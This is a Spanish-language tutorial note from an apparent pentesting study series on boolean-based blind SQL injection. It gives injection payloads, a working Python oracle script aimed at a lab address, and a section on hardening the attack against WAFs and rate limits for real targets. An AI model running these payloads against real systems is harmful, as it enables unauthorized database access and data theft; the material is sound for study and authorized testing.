---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Fecha de actualización: 2026-06-04
Nota previa: "[[02 - Identificar SQLi basada en booleanos]]"
Nota siguiente: "[[04 - Extracción de datos boolean-based]]"
Area: "[[SQL Injection.base|SQL Injection]]"
---
---

Confirmada la inyección [[02 - Identificar SQLi basada en booleanos|boolean-based]], el siguiente paso es construir un **oráculo**: una función a la que le pasamos una condición SQL y nos devuelve `True` o `False` según cómo responda la aplicación. <mark style="background: #ADCCFFA6;">El oráculo es la abstracción central de toda blind SQLi</mark>: una vez que funciona, extraer datos es cuestión de hacerle las preguntas correctas.

# La idea: anclar a un dato conocido

Sabemos que `maria` existe, así que inyectamos la condición `q` a evaluar tras su nombre:

```sql
SELECT Username FROM Users WHERE Username = 'maria' AND (q)-- -
```

- Si `q` es **verdadera**, la consulta devuelve la fila de `maria` → la app responde `status:taken`.
- Si `q` es **falsa**, no devuelve nada → `status:available`.

Probándolo a mano: `maria' AND 1=1-- -` da `taken` (verdadero) y `maria' AND 1=0-- -` da `available` (falso). <mark style="background: #FFB8EBA6;">El ancla debe ser un usuario que exista</mark>; con uno inexistente la respuesta sería siempre `available` y el oráculo no distinguiría nada.

# El oráculo en Python

Se automatiza con un pequeño script que URL-codifica el payload, lo envía y traduce la respuesta a un booleano:

```python
#!/usr/bin/python3
import requests
import json
from urllib.parse import quote_plus

target = "maria"          # usuario que sabemos que existe (el ancla)
BASE = "http://192.168.43.37/api/check-username.php"

def oracle(q):
    """Devuelve True si la condición SQL `q` se evalúa como verdadera en el backend."""
    payload = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(f"{BASE}?u={payload}")
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Validar el oráculo antes de confiar en él
assert oracle("1=1")        # debe ser True
assert not oracle("1=0")    # debe ser False
```

<mark style="background: #8000E1A6;">Los dos `assert` no son decorativos: validan que el oráculo funciona</mark> antes de lanzar miles de peticiones de extracción. Si `oracle("1=1")` no es `True`, algo está mal (contexto de comillas, comentario, ancla) y hay que corregirlo ya, no tras una hora de extracción inútil.

# Generalizar el indicador `TRUE`/`FALSE`

Aquí el oráculo se basa en `status == 'taken'`, pero el indicador depende de cada aplicación. <mark style="background: #FFB86CA6;">El oráculo debe adaptarse a la señal disponible</mark>:

| Señal | Cómo distinguir TRUE/FALSE |
| ----- | -------------------------- |
| Texto en el cuerpo | `"taken" in r.text`, `"Welcome" in r.text` |
| Longitud de la respuesta | `len(r.text) > N` |
| Código HTTP | `r.status_code == 200` |
| Presencia de un elemento | un redirect, una cookie, un campo del JSON |

Si **ninguna** señal de contenido sirve, el oráculo se construye sobre el tiempo de respuesta → [[06 - Identificar SQLi basada en tiempo|time-based]].

# Robustez para uso real

> [!warning]+
> Un oráculo de laboratorio asume respuestas limpias; uno real debe sobrevivir a producción. <mark style="background: #FF5582A6;">Añade tolerancia a fallos antes de lanzar la extracción masiva</mark>:
> - **Rate limiting**: intercala `time.sleep()` o limita la concurrencia; cientos de peticiones idénticas disparan WAFs y bloqueos por IP.
> - **Reintentos**: ante un timeout o un 429/503, reintenta en lugar de interpretar el fallo como un bit erróneo.
> - **Sesión persistente**: usa `requests.Session()` para reutilizar conexión y cookies (más rápido y mantiene la sesión si el endpoint la requiere).
> - **Verificación cruzada**: en entornos ruidosos, repite cada pregunta y compara, para no corromper el dato extraído con un falso positivo puntual.

# Ejemplo de uso: contar filas

Con el oráculo listo, ya podemos interrogar a la base de datos. Por ejemplo, averiguar cuántas filas tiene la tabla `users` preguntando por rangos:

```python
oracle("(SELECT COUNT(*) FROM users) > 0")   # ¿hay usuarios?
oracle("(SELECT COUNT(*) FROM users) > 100") # ¿más de 100?
```

Refinando la pregunta (búsqueda binaria sobre el número) se determina el valor exacto. Esa misma mecánica, aplicada carácter a carácter, permite extraer cualquier dato: [[04 - Extracción de datos boolean-based]].
